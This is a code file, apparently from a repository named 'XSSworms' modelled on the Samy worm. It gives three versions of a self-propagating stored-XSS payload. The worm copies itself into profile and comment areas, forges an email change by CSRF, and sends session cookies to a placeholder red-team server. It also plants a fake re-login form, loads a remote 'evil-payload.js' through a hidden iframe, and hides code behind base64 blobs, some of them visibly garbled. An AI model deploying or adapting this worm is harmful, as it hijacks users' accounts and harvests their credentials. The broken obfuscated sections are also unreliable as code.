# XSSworms
Based on samy

Functional
```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Inject itself for persistence
    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = '(' + arguments.callee.toString() + ')();';
    document.body.appendChild(script);

    // Define self-replicating payload
    var payload = `<script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
    </script>`;

    // Simulate persistent XSS injection into a stored area
    var targetElement = document.getElementById("user-profile") || document.getElementById("comment-section");
    if (targetElement) {
        targetElement.innerHTML += payload;
    }

    // 🔗 CSRF Attack Simulation: Change User Email
    fetch('/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=attacker@redteam.com'
    });

    // 🔗 Session Hijacking (Demo - Ethical logging)
    var sessionData = document.cookie;
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS Session Test',
            session: sessionData,
            affectedPage: window.location.href
        })
    });

    // 🔗 Fake Login Phishing Simulation
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;

    document.body.innerHTML += fakeLogin;

    // Ethical Logging
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS PoC Executed',
            timestamp: new Date().toISOString(),
            affectedPage: window.location.href
        })
    });

    // Proof-of-concept alert
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');

})();
```
Auto deploy

```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Obfuscate script injection with base64 encoding
    var obfuscatedPayload = 'KGZ1bmN0aW9uKCkgewogICAgaWYgKGRvY3VtZW50LmdldElkKCdxc3Mtd29ybScpKSBpZnJlY2xpZnQgcmV0dXJuOwogICAgdmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgc2NyaXB0LmlkID0gJ3hzc3Mtd29ybSc7CiAgICBzY3JpcHQuaW5uZXJIVE1MID0gJygmYXJncy5jYWxsZUVsZW1lbnQudG9TdHJpbmcoKTsgZG9jdW1lbnQuYm9keUFwcGVuZENoaWxkKCczYmNsYScsIHNjcmlwdCk7Cn0pKCk7';

    var decodedPayload = atob(obfuscatedPayload); // Decode the obfuscated payload

    // Inject the decoded payload
    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = decodedPayload;
    document.body.appendChild(script);

    // Payload Replication Mechanism
    var replicationPayload = `
        <script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
        </script>`;

    // Auto-inject payload into various areas like profile, comments, and more
    var elementsToInject = [
        document.getElementById("user-profile"),
        document.getElementById("comment-section"),
        document.querySelectorAll('input[type="text"], textarea')
    ];

    elementsToInject.forEach(function(target) {
        if (target) {
            target.innerHTML += replicationPayload;
        }
    });

    // 🔗 CSRF Attack Simulation: Change User Email
    fetch('/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=attacker@redteam.com'
    });

    // 🔗 Session Hijacking (Demo - Ethical logging)
    var sessionData = document.cookie;
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS Session Test',
            session: sessionData,
            affectedPage: window.location.href
        })
    });

    // 🔗 Fake Login Phishing Simulation
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;
    document.body.innerHTML += fakeLogin;

    // Ethical Logging
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'XSS PoC Executed',
            timestamp: new Date().toISOString(),
            affectedPage: window.location.href
        })
    });

    // Proof-of-concept alert
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');
})();
```
Obfuscation
```javascript
(function() {
    if (document.getElementById('xss-worm')) return; // Prevent duplicates

    // Obfuscate script creation using dynamic function and variable names
    var obfuscatedFunc = atob('ZnVuY3Rpb24oKXsgdmFyIHNoZ3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQtYnJvdycpOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZ291cyA9ICd4c3Mtd29ybic7IHNjaXB0LmlkID0gJ3hzcy13b3JtJzsgaWYgKGRvY3VtZW50LmdldElkKCd4c3Mtd29ybicpKSBpZnJlY2xpZnQgcmV0dXJuOyBzaGd4LnN5bmNocm9uZovuowOnew4)');
    var decodedFunc = atob(obfuscatedFunc);

    var script = document.createElement('script');
    script.id = 'xss-worm';
    script.innerHTML = decodedFunc;
    document.body.appendChild(script);

    // Dynamic Payload Replication
    var replicationPayload = `
        <script id="xss-worm">
        (function() {
            if (document.getElementById('xss-worm')) return;
            var script = document.createElement('script');
            script.id = 'xss-worm';
            script.innerHTML = '(' + arguments.callee.toString() + ')();';
            document.body.appendChild(script);
        })();
        </script>`;

    // ** Dynamic Injection Based on Vulnerable Elements **
    var elementsToInject = [
        document.getElementById("user-profile"),
        document.getElementById("comment-section"),
        document.querySelectorAll('input[type="text"], textarea')
    ];

    elementsToInject.forEach(function(target) {
        if (target) {
            // Further filter based on vulnerability conditions (e.g., missing sanitization)
            if (target.innerHTML.includes('<script>')) {
                target.innerHTML += replicationPayload;  // Inject the payload in detected vulnerable areas
            }
        }
    });

    // Bypass any CSP headers with customized script injections if applicable
    var injectViaIframe = `
        <iframe style="display:none;" src="javascript:document.body.appendChild(document.createElement('script')).src='https://example.com/evil-payload.js';"></iframe>
    `;
    document.body.innerHTML += injectViaIframe;

    // Ethical Monitoring & Reporting (automated log generation)
    fetch('https://your-redteam-server/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            event: 'Enhanced XSS PoC Executed',
            timestamp: new Date().toISOString(),
            detectedVulnerability: 'Missing Input Sanitization',
            affectedPage: window.location.href
        })
    });

    // Simulate a CSRF attack by dynamically submitting forms
    var csrfPayload = `
        <form method="POST" action="/change-email" style="display:none;">
            <input type="text" name="email" value="attacker@redteam.com">
        </form>
        <script>document.forms[0].submit();</script>
    `;
    document.body.innerHTML += csrfPayload;

    // Inject the fake login page again (if not detected earlier)
    var fakeLogin = `
        <form id="fake-login" onsubmit="event.preventDefault(); sendFakeLogin();">
            <h3>Session Expired - Please Reauthenticate</h3>
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
        function sendFakeLogin() {
            fetch('https://your-redteam-server/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    event: 'Fake Login Submitted',
                    username: document.getElementById('username').value
                })
            });
            alert('XSS Test: Fake login submitted.');
        }
        </script>
    `;
    document.body.innerHTML += fakeLogin;

    // Proof-of-concept message (for controlled environment)
    alert('XSS Test Payload Executed. If you see this, stored XSS is possible.');
})();
```
Fully Obfuscated with dynamic deployment

```javascript

```


